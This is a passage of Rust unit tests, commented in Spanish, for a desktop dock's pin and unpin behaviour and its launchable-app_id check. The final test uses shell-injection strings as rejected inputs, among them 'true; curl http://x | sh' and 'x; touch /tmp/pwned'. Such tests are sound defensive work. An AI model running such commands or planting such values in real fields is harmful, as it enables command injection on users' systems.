        assert_eq!(dock.items()[0].exec(), crate::config::LAUNCHPAD);
        assert!(!dock.desanclar(&id));
        assert_eq!(dock.items().len(), antes);
    }

    /// El ciclo completo: una ventana sin lanzador entra en el dock, se fija
    /// con el clic derecho, sobrevive al cierre de la ventana y se puede
    /// quitar. Es lo que el usuario pidió como "pin".
    #[test]
    fn una_ventana_se_fija_y_sobrevive_al_cierre() {
        let mut dock = Dock::from_config(&crate::Config::default().dock);
        let antes = dock.items().len();

        dock.set_abiertas(&["org.bookos.prueba".into()]);
        assert_eq!(dock.items().len(), antes + 1, "la ventana no entró al dock");
        assert!(!dock.esta_anclada("org.bookos.prueba"));
        assert!(
            !dock
                .como_configuracion()
                .iter()
                .any(|l| l.contains("prueba")),
            "lo que no está fijado no se guarda"
        );

        dock.alternar_anclado("org.bookos.prueba", "prueba", "prueba");
        assert!(dock.esta_anclada("org.bookos.prueba"));

        // Se cierra la ventana: al estar fijada, se queda.
        dock.set_abiertas(&[]);
        assert!(dock.esta_anclada("org.bookos.prueba"), "se fue al cerrarse");
        assert!(
            dock.como_configuracion()
                .iter()
                .any(|l| l.contains("prueba"))
        );

        dock.alternar_anclado("org.bookos.prueba", "prueba", "prueba");
        assert_eq!(dock.items().len(), antes, "no volvió a su estado inicial");
    }

    /// Una ventana sin fijar se va del dock al cerrarse.
    #[test]
    fn una_ventana_sin_fijar_se_va_al_cerrarse() {
        let mut dock = Dock::from_config(&crate::Config::default().dock);
        let antes = dock.items().len();
        dock.set_abiertas(&["org.bookos.prueba".into()]);
        dock.set_abiertas(&[]);
        assert_eq!(dock.items().len(), antes);
    }

    /// El launchpad no se puede quitar: es la única forma de abrir lo que no
    /// está en el dock.
    #[test]
    fn el_launchpad_no_se_quita() {
        let mut dock = Dock::from_config(&crate::Config::default().dock);
        let antes = dock.items().len();
        dock.alternar_anclado(
            crate::config::LAUNCHPAD,
            crate::config::LAUNCHPAD,
            "launchpad",
        );
        assert_eq!(dock.items().len(), antes);
    }

    /// Un `app_id` con una orden dentro no se convierte en algo que lanzar.
    ///
    /// El `app_id` lo elige el cliente y de ahí sale el `exec` del item cuando
    /// no hay `.desktop`; ese `exec` acaba en `/bin/sh -c`.
    #[test]
    fn un_app_id_con_orden_dentro_no_se_lanza() {
        assert!(lanzable("org.kde.konsole"));
        assert!(lanzable("code-oss"));
        assert!(lanzable("gtk4-demo"));
        assert!(!lanzable("true; curl http://x | sh"));
        assert!(!lanzable("prog $(id)"));
        assert!(!lanzable("prog&&otro"));
        assert!(!lanzable(""));

        let mut dock = Dock::from_config(&crate::Config::default().dock);
        dock.set_abiertas(&["x; touch /tmp/pwned".into()]);
        let item = dock
            .items()
            .iter()
            .find(|i| i.app_id() == "x; touch /tmp/pwned")
            .expect("el icono entra en el dock mientras su ventana viva");
        assert_eq!(item.exec(), "", "no puede quedar nada que pasarle al shell");
    }
}
